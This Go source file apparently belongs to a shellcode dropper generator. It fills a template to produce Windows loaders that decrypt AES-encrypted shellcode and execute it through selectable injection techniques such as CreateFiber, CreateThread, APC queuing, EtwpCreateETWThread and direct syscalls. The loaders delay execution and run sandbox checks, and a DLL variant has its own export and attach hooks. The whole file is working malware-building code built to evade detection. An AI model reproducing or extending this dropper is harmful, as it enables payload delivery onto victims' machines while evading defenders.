package local

import (
	"io"
	"log"
	"text/template"

	"github.com/Epictetus24/godropit/internal/gengo/delivery"
	"github.com/Epictetus24/godropit/pkg/dropfmt"
)

var Droppers = []string{"CreateFiber", "CreateThread", "CreateThreadNative", "EtwpCreateETWThread", "NtQueueAPCThreadExLocal", "goSyscall", "UUIDFromStringA"}

type LocalDropper struct {
	FuncName   string
	FileName   string
	KeyStr     string //EncryptionKey
	BufStr     string //Base64Shellcodestr
	Delay      int
	Dlls       string
	Extra      string
	Hold       string
	BoxChkFunc string
	BoxChkImp  string
	ChkBox     string
	Inject     string
	Export     string
	Domain     string
	Import     string
	C          string
	ProcAttach string
	Init       string
}

var FuncName = "checkData"
var Export = "export"

var Hold = `
	for {

	}
`

const LocalMain = `package main

{{.C}}

import (
	{{.Import}}

	{{.BoxChkImp}}
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

var hope = "{{.Domain}}"

{{.Extra}}

{{.BoxChkFunc}}

{{.ProcAttach}}

func init() {
	{{.ChkBox}}	
	{{.Init}}
}
func main() {

	{{.FuncName}}()

}

//{{.Export}} {{.FuncName}}
func {{.FuncName}}() {

	bufstring := "{{.BufStr}}"
	kstring := "{{.KeyStr}}"
	time.Sleep({{.Delay}}* time.Second)

	shellcode, err := box.AESDecrypt(kstring, bufstring)
	if err != nil {
		time.Sleep({{.Delay}}* time.Second)
		os.Exit(0)
	}
	{{.Dlls}}
	{{.Inject}}
}
`

// Writes a local template, which usually includes a new process with arguments.
func (cd *LocalDropper) WriteSrc(writer io.Writer) error {
	tmpl, err := template.New("local").Parse(LocalMain)
	if err != nil {
		log.Fatalf("[local] Error writing template: %v\n", err)
		return err
	}
	cd.FuncName = FuncName
	cd.Export = ""
	cd.C = ""

	err = tmpl.Execute(writer, cd)
	return nil

}

func (cd *LocalDropper) WriteSharedSrc(writer io.Writer) error {
	tmpl, err := template.New("local").Parse(LocalMain)
	if err != nil {
		return err
	}
	cd.C = delivery.DllImport
	cd.ProcAttach = delivery.DllFunc
	cd.FuncName = FuncName
	cd.Export = Export
	cd.Init = cd.FuncName + "()"
	err = tmpl.Execute(writer, cd)
	return nil

}

func NewLocal(hold bool, domain string, delay int) LocalDropper {
	var cD LocalDropper
	cD.Delay = delay
	if hold {
		cD.Hold = Hold
	} else {
		cD.Hold = ""
	}

	_, selected, _ := dropfmt.PromptList(Droppers, "Select the local dropper you would like to use:")

	switch selected {
	case "CreateFiber":
		cD.Dlls = CreateFiberDlls
		cD.Inject = CreateFiber
		cD.Import = CreateFiberImports
	case "CreateThread":
		cD.Dlls = ""
		cD.Inject = CreateThread
		cD.Import = CreateThreadImports
	case "CreateThreadNative":
		cD.Dlls = CreateThreadNativeDlls
		cD.Inject = CreateThreadNative
		cD.Import = CreateThreadNativeImports
	case "EtwpCreateETWThread":
		cD.Dlls = EtwpCreateETWThreadDlls
		cD.Inject = EtwpCreateETWThread
		cD.Import = EtwpCreateETWThreadImports
	case "NtQueueAPCThreadExLocal":
		cD.Dlls = NtQueueAPCThreadExLocalDlls
		cD.Inject = NtQueueAPCThreadExLocal
		cD.Import = NtQueueAPCThreadExLocalImports
		cD.Extra = NtQueueAPCThreadExLocalExtra
	case "goSyscall":
		cD.Dlls = goSyscallDlls
		cD.Inject = goSyscall
		cD.Import = goSyscallImports
	case "UUIDFromStringA":
		cD.Dlls = UUIDFromStringADlls
		cD.Inject = UUIDFromStringA
		cD.Import = UUIDFromStringAImports
		cD.Extra = UUIDFromStringAExtra

	}

	return cD
}
